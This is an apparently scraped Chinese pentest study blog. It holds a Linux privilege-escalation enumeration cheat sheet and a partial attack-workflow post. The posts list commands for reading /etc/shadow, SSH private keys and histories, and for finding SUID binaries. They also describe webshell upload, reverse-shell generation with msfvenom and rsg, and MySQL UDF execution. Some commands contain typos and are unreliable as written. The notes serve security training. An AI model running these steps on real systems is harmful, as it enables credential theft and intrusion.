title="应用程序和服务信息收集"></a>应用程序和服务信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行了什么服务，什么服务有哪个用户的权限</span></span><br><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">哪些服务正在由 root 运行？</span></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装了哪些应用程序？它们是什么版本？哪些目前正在运行？</span></span><br><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有任何服务设置配置错误？是否附加了任何脆弱的插件？</span></span><br><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.*r.*/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有哪些计划任务？</span></span><br><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有明文凭据信息？</span></span><br><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure><h2 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统有哪些网卡？网卡连接到哪些网络？</span></span><br><span class="line">/sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络配置设置信息（DHCP服务器、DNS服务器、网关）</span></span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有无其他主机和当前主机有连接</span></span><br><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查路由和arp表</span></span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">/sbin/route -nee</span><br></pre></td></tr></table></figure><h2 id="凭据和用户信息收集"><a href="#凭据和用户信息收集" class="headerlink" title="凭据和用户信息收集"></a>凭据和用户信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前用户是谁，谁登录过当前主机，主机上有哪些用户，谁有sudo权限？</span></span><br><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd | cut -d: -f1    # List of users</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;   # List of super users</span><br><span class="line">awk -F: &#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27; /etc/passwd   # List of super users</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常见敏感文件</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">home目录下文件</span></span><br><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认配置下的密码文件所在路径</span></span><br><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户的历史记录里有没有密码？</span></span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.profile</span><br><span class="line">cat /var/mail/root</span><br><span class="line">cat /var/spool/mail/root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">公钥和私钥信息</span></span><br><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure><h2 id="文件系统信息收集"><a href="#文件系统信息收集" class="headerlink" title="文件系统信息收集"></a>文件系统信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/中可以写入哪些配置文件？能够重新配置服务吗？</span></span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.*w.*/&#x27; 2&gt;/dev/null     # Anyone</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^..w/&#x27; 2&gt;/dev/null       # Owner</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.....w/&#x27; 2&gt;/dev/null    # Group</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /w.$/&#x27; 2&gt;/dev/null        # Other</span><br><span class="line"></span><br><span class="line">find /etc/ -readable -type f 2&gt;/dev/null               # Anyone</span><br><span class="line">find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/var/目录下常见敏感路径</span></span><br><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat /var/lib/dhcp3/dhclient.leases</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站上有任何配置文件隐藏吗？ 是否有包含数据库信息的配置文件？</span></span><br><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志文件中是否有任何内容（可以和文件包含漏洞结合）</span></span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否有未挂载的文件系统？</span></span><br><span class="line">cat /etc/fstab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用了“Advanced Linux File Permissions”吗？ 比如SUID和GUID</span></span><br><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span><br><span class="line">for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">哪里可以写入或者执行？常见的有/tmp、/var/tmp、/dev/shm</span></span><br><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找nobody文件</span></span><br><span class="line">find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files</span><br><span class="line">find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</span><br></pre></td></tr></table></figure><h2 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装了哪些开发工具？</span></span><br><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">怎么把文件传上去？</span></span><br><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>筛选具有登录权限的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd l grep sh$</span><br></pre></td></tr></table></figure><p>使用ls -la查看用户目录的所有文件，重点看一下.zsh_history</p><p>查看当前目录中所有文件里有没有包含关键字pass的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -Ri pass .</span><br></pre></td></tr></table></figure><p>查看hostname主机名的意义在于，在企业环境下，很多主机的主机名的命名都是和主机的功能密切相关的</p><p>收集主机发行版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">  cat /etc/lsb-release      # Debian based</span><br><span class="line">  cat /etc/redhat-release   # Redhat based</span><br><span class="line">cat /etc/os-release</span><br><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>然后searchspoit去搜索exp，内核版本4.x或者5.x很有可能可以通过内核提权，但是考试的时候可能会故意把内核版本做低，把依赖库删掉</p><p>查看系统当前进程，重点关注有没有以root运行的进程或者服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>查看网卡、路由信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ip route</span><br><span class="line">route</span><br><span class="line">ss -pantu #查看主机和其他主机是否有连接</span><br></pre></td></tr></table></figure><p>查看防火墙规则（不一定有权限访问），如有权限，可能影响反弹shell的时候的端口选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/iptables/rules.xxx</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron_xxxxx</span><br><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p>使用rsg生成反弹shell的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsg $IP $port 语言框架(nc\powershell\bash\不设置该参数默认生成所有的)</span><br></pre></td></tr></table></figure><p>查看系统安装了哪些软件包，以ii开头的就是已经安装的，可以搜索有无已知漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l</span><br></pre></td></tr></table></figure><p>查看文件系统权限命令，可以在<a href="https://gtfobins.github.io下找提权方法/">https://gtfobins.github.io下找提权方法</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找属于root用户的且当前用户可写的，可执行的文件，-u=x表示至少有执行权限，u=x表示只有执行权限</span></span><br><span class="line">find / --witeable -type f -user root -perm -u=x 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找SUID文件，属于root用户的</span></span><br><span class="line">find / -perm -u=s -type f -user root 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>比如suid权限，就是当前用户在执行具有suid权限的可执行文件时，会临时把自己提升到root权限，假如vim有suid权限，那么就可以使用vim修改&#x2F;etc&#x2F;passwd文件，将里面的root用户的密码修改成攻击者自己生成的密码，然后<code>su -</code>切换到root身份</p><p>查看硬盘挂载信息，重点关注多硬盘的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line">mount</span><br><span class="line">lsblk</span><br></pre></td></tr></table></figure><p>查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure><p>web目录下的配置文件里也有可能有凭据信息，可以拿来密码复用试一下</p><p>查看具有cap权限的命令，然后把命令丢到<a href="https://gtfobins.github.io下找提权方法/">https://gtfobins.github.io下找提权方法</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>sudu权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前用户可以以sudo执行什么命令</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>自动化提权，linpeas，github开源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/peass-ng/PEASS-ng</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows下运行之前需要先修改一个注册表项</span></span><br><span class="line">REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SomeTips</title>
      <link href="/2024/04/13/SomeTips/"/>
      <url>/2024/04/13/SomeTips/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透流程思路概述"><a href="#渗透流程思路概述" class="headerlink" title="渗透流程思路概述"></a>渗透流程思路概述</h2><p>扫描</p><p>假定目标域名是sandbox.local</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo &#x27;10.11.1.250 sandbox.local&#x27;&gt;&gt;/etc/hosts&quot;</span><br><span class="line">sudo nmap -sC -sS -p0-65535 sandbox.local</span><br><span class="line">sudo nmap -p22,80 -sV -A sandbox.local</span><br></pre></td></tr></table></figure><p>WEB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://sandbox.local</span><br></pre></td></tr></table></figure><p>假设发现了wp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url sandbox.local --enumerate ap,at,cb,dbe</span><br><span class="line">wpscan --api-token $wPSCAN_KEY --url http:/llsandbox.local/wp -e</span><br></pre></td></tr></table></figure><p>搜索wp的插件漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -update</span><br><span class="line">searchsploit elementor</span><br><span class="line">searchsploit ocear-extra</span><br><span class="line">searchsploit wp-survey-and-poll</span><br><span class="line">searchsploit ocean</span><br><span class="line">searchsploit survey poll</span><br></pre></td></tr></table></figure><p>如果拿到了wp的密码密文，丢到爆破里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$PASS&#x27; &gt; pass.txt</span><br><span class="line">john --wordlist=rockyou.txt pass.txt</span><br></pre></td></tr></table></figure><p>然后登录后台，上传插件的webshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install seclists # 包含wp插件</span><br><span class="line">ls /usr/share/seclists/Web-Shells/WordPress</span><br><span class="line">sudo zip plugin-shell.zip plugin-shell.php</span><br></pre></td></tr></table></figure><p>然后执行wget从攻击机下载回弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p xxx LHOST=xxx LPORT=xxx -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>然后去web目录下找配置文件里的数据库账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/web-config.php</span><br></pre></td></tr></table></figure><p>可以把扫描端口的脚本上传到被控机器上执行，做端口，连到数据库</p><p>使用mysql的UDF执行系统命令</p><p>UDF的库文件位于</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate lib_mysqludf_sys.so # linux</span><br><span class="line">locate lib_mysqludf_sys.dll #windows</span><br></pre></td></tr></table></figure><p>生成库文件的二进制流</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#x27;\n&#x27; &gt; 